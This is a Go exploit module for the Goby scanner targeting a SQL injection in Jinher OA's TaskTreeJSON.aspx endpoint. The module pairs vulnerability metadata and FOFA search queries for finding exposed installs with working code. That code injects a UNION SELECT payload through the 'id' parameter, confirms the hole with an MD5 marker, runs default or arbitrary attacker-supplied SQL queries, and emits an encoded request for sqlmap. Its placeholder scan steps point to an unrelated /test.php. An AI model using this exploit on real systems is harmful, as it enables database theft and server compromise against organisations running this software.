package exploits

import (
	"fmt"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"net/url"
	"regexp"
	"strings"
)

func init() {
	expJson := `{
    "Name": "Jinher-OA /TaskTreeJSON.aspx SQL Injection Vulnerability",
    "Description": "<p>Jinhe OA collaborative office management system C6 software (referred to as Jinhe OA), in line with the principle of simplicity, applicability, efficiency, fit the actual needs of enterprises and institutions, the implementation of generalization, standardization, intelligence, humanized product design, fully embodies the standardization of enterprises and institutions to regulate the management of the office efficiency of the core idea, to provide users with a set of standard office automation solutions, to help enterprises and institutions to Rapidly establish a convenient and standardized office environment. </p><p>Jinhe OA /TaskTreeJSON.aspx interface SQL injection vulnerability, in addition to SQL injection vulnerability can be exploited to obtain information in the database (for example, administrator background password, site user personal information), and even in the case of high privileges can write Trojan horse to the server, further access to the server system privileges.</p>",
    "Product": "Jinher-OA",
    "Homepage": "http://www.jinher.com/",
    "DisclosureDate": "2024-04-10",
    "PostTime": "2024-10-15",
    "Author": "202205566302@smail.xtu.edu.cn",
    "FofaQuery": "(title=\"金和协同管理平台\" || body=\"js/PasswordCommon.js\" || body=\"js/PasswordNew.js\" || body=\"Jinher Network\" || (body=\"c6/Jhsoft.Web.login\" && body=\"CloseWindowNoAsk\"))",
    "GobyQuery": "(title=\"金和协同管理平台\" || body=\"js/PasswordCommon.js\" || body=\"js/PasswordNew.js\" || body=\"Jinher Network\" || (body=\"c6/Jhsoft.Web.login\" && body=\"CloseWindowNoAsk\"))",
    "Level": "1",
    "Impact": "<p>Jinhe OA /TaskTreeJSON.aspx interface SQL injection vulnerability, in addition to SQL injection vulnerability can be exploited to obtain information in the database (for example, administrator background password, site user personal information), and even in the case of high privileges can write Trojan horse to the server, further access to the server system privileges.</p>",
    "Recommendation": "<p>1. Deploy a web application firewall to monitor database operations. </p><p>2. If not necessary, prohibit public network access to the system.</p>",
    "References": [],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "attackType",
            "type": "select",
            "value": "default,custom,sqlpoint",
            "show": ""
        },
        {
            "name": "default",
            "type": "select",
            "value": "db_name,db_version,user_name",
            "show": "attackType=default"
        },
        {
            "name": "custom",
            "type": "input",
            "value": "SELECT @@VERSION",
            "show": "attackType=custom"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "SQL Injection"
    ],
    "VulType": [
        "SQL Injection"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "5.0",
    "Translation": {
        "CN": {
            "Name": "金和OA /TaskTreeJSON.aspx SQL 注入漏洞",
            "Product": "金和网络-金和OA",
            "Description": "<p>金和OA协同办公管理系统C6软件（简称金和OA），本着简单、适用、高效的原则，贴合企事业单位的实际需求，实行通用化、标准化、智能化、人性化的产品设计，充分体现企事业单位规范管理、提高办公效率的核心思想，为用户提供一整套标准的办公自动化解决方案，以帮助企事业单位迅速建立便捷规范的办公环境。</p><p>金和OA /TaskTreeJSON.aspx接口存在SQL注入漏洞，攻击者除了可以利用 SQL 注入漏洞获取数据库中的信息（例如，管理员后台密码、站点的用户个人信息）之外，甚至在高权限的情况可向服务器中写入木马，进一步获取服务器系统权限。<br></p>",
            "Recommendation": "<p>1、部署Web应用防火墙，对数据库操作进行监控。&nbsp;</p><p>2、如非必要，禁止公网访问该系统。<br></p>",
            "Impact": "<p>金和OA&nbsp;/TaskTreeJSON.aspx接口存在SQL注入漏洞，攻击者除了可以利用 SQL 注入漏洞获取数据库中的信息（例如，管理员后台密码、站点的用户个人信息）之外，甚至在高权限的情况可向服务器中写入木马，进一步获取服务器系统权限。<br></p>",
            "VulType": [
                "SQL注入"
            ],
            "Tags": [
                "SQL注入"
            ]
        },
        "EN": {
            "Name": "Jinher-OA /TaskTreeJSON.aspx SQL Injection Vulnerability",
            "Product": "Jinher-OA",
            "Description": "<p>Jinhe OA collaborative office management system C6 software (referred to as Jinhe OA), in line with the principle of simplicity, applicability, efficiency, fit the actual needs of enterprises and institutions, the implementation of generalization, standardization, intelligence, humanized product design, fully embodies the standardization of enterprises and institutions to regulate the management of the office efficiency of the core idea, to provide users with a set of standard office automation solutions, to help enterprises and institutions to Rapidly establish a convenient and standardized office environment.&nbsp;</p><p>Jinhe OA /TaskTreeJSON.aspx interface SQL injection vulnerability, in addition to SQL injection vulnerability can be exploited to obtain information in the database (for example, administrator background password, site user personal information), and even in the case of high privileges can write Trojan horse to the server, further access to the server system privileges.<br></p>",
            "Recommendation": "<p>1. Deploy a web application firewall to monitor database operations.&nbsp;</p><p>2. If not necessary, prohibit public network access to the system.<br></p>",
            "Impact": "<p>Jinhe OA /TaskTreeJSON.aspx interface SQL injection vulnerability, in addition to SQL injection vulnerability can be exploited to obtain information in the database (for example, administrator background password, site user personal information), and even in the case of high privileges can write Trojan horse to the server, further access to the server system privileges.<br></p>",
            "VulType": [
                "SQL Injection"
            ],
            "Tags": [
                "SQL Injection"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "Variables": {},
    "PocId": "9961"
}`
	setSqlPayloadHashasdfiajsdghasijdchashjcysdhjfuasfyhwseyfavbsfgvktysrgbfeyfbahb := func(hostInfo *httpclient.FixUrl, sql string) (resp *httpclient.HttpResponse, vulurl string, err error) {
		setGetRequest := func(hostInfo *httpclient.FixUrl, sqlUrl string, head map[string]string) (*httpclient.HttpResponse, error) {
			//对sql进行url编码
			sql = `1' union all select null,(` + sql + `),null,null,null,null,null,null,null-- `
			sql = url.QueryEscape(sql)
			postRequest := httpclient.NewGetRequestConfig(sqlUrl + "?id=" + sql)
			postRequest.Timeout = 15
			postRequest.VerifyTls = false
			postRequest.FollowRedirect = false
			for headName, headValue := range head {
				postRequest.Header.Store(headName, headValue)
			}
			return httpclient.DoHttpRequest(hostInfo, postRequest)
		}
		urlget := "/C6/JHSoft.Web.DailyTaskManage/TaskTreeJSON.aspx/"

		resp, err = setGetRequest(hostInfo, urlget, map[string]string{})
		if err != nil || resp.StatusCode != 200 {
			return resp, "", err
		}
		//配置漏洞存在的路径
		vulurl = "/C6/JHSoft.Web.DailyTaskManage/TaskTreeJSON.aspx/"

		return resp, vulurl, nil
	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, hostInfo *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {

			// 1.配置验证poc时返回包需存在的字符串，exmple:以mysql的报错注入为例，XPATH syntax error
			content := "C72DECC0A16932F21AB2A090AF1AA21D"

			// 2. 设置sql语句,同样这个sql语句要设置到，exp_params中的custom参数中
			// 默认是MySQL / MariaDB数据库 : 用DATABASE()查询数据库名，用CONCAT()拼接字符, example:CONCAT(0x7e,(select user()),0x7e)
			// PostgreSQL : 用current_database()查询数据库名，用CONCAT()拼接字符
			// SQLite : 用database_list查询数据库名，用||拼接字符
			// SQL Server : 用DB_NAME()查询数据库名，用+拼接字符
			// Oracle : 用SELECT name FROM v$database查询数据库名，用concat()拼接字符
			sql := `select CONVERT(VARCHAR(32),HASHBYTES('MD5','aasfcacxaasdcaxas'),2)`

			// 3.设置正则表达式，用于匹配漏洞返回包中的数据
			regular := `":"\|\|([\s\S]*?)",`

			makeRegular := func(RegularContent string, RegularUrl string) (string, error) {
				reRequest := regexp.MustCompile(RegularUrl)
				if !reRequest.MatchString(RegularContent) {
					return "", fmt.Errorf("can't match value")
				}
				getname := reRequest.FindStringSubmatch(RegularContent)
				return getname[1], nil
			}
			sendPayload := setSqlPayloadHashasdfiajsdghasijdchashjcysdhjfuasfyhwseyfavbsfgvktysrgbfeyfbahb
			resp, vulurl, err := sendPayload(hostInfo, sql)
			if err != nil {
				return false
			}
			if output, err := makeRegular(resp.RawBody, regular); err != nil || !strings.Contains(output, content) {
				return false
			}
			if err != nil {
				return false
			}

			// 拼接SQL注入数据包的请求路径即可
			ss.VulURL = hostInfo.FixedHostInfo + vulurl
			return true
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			// 1.配置验证poc时返回包需存在的字符串，exmple:以mysql的报错注入为例，XPATH syntax error
			//content := "XPATH syntax error"

			// 2.配置sqlpoint，供sqlmap工具使用
			// expResult.HostInfo.HostInfo
			sqlpoint := `GET /C6/JHSoft.Web.DailyTaskManage/TaskTreeJSON.aspx/?id=%31%27%20%75%6e%69%6f%6e%20%61%6c%6c%20%73%65%6c%65%63%74%20%6e%75%6c%6c%2c%28%73%65%6c%65%63%74%20%36%33%34%35%2a%35%36%35%39%29%2c%6e%75%6c%6c%2c%6e%75%6c%6c%2c%6e%75%6c%6c%2c%6e%75%6c%6c%2c%6e%75%6c%6c%2c%6e%75%6c%6c%2c%6e%75%6c%6c%2d%2d%20  HTTP/1.1
Host: ` + expResult.HostInfo.HostInfo + `
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36
`

			// 3.设置正则表达式，用于匹配漏洞返回包中的数据
			regular := `":"\|\|([\s\S]*?)",`

			makeRegular := func(RegularContent string, RegularUrl string) (string, error) {
				reRequest := regexp.MustCompile(RegularUrl)
				if !reRequest.MatchString(RegularContent) {
					return "", fmt.Errorf("can't match value")
				}
				getname := reRequest.FindStringSubmatch(RegularContent)
				return getname[1], nil
			}
			sendPayload := setSqlPayloadHashasdfiajsdghasijdchashjcysdhjfuasfyhwseyfavbsfgvktysrgbfeyfbahb
			attacktype := goutils.B2S(ss.Params["attackType"])
			if attacktype == "custom" || attacktype == "default" {
				sql := ""
				if attacktype == "custom" {
					sql = goutils.B2S(ss.Params["custom"])
				} else {
					way := goutils.B2S(ss.Params["default"])
					if way == "db_name" {
						sql = "select DB_NAME()"
					} else if way == "db_version" {
						sql = "select @@VERSION"
					} else if way == "user_name" {
						sql = "select SYSTEM_USER"
					}
				}
				resp, _, err := sendPayload(expResult.HostInfo, sql)
				if err != nil {
					expResult.Success = false
					expResult.Output = "利用失败"
					return expResult
				}
				output, err := makeRegular(resp.RawBody, regular)
				if err != nil || output == "" {
					expResult.Success = false
					expResult.Output = "正则匹配失败:\n" + err.Error()
					return expResult
				}
				expResult.Success = true
				expResult.Output = output
			} else if attacktype == "sqlpoint" {
				expResult.Success = true
				expResult.Output = sqlpoint
			} else {
				expResult.Success = false
				expResult.Output = "未知的利用方式"
			}
			return expResult
		},
	))
}
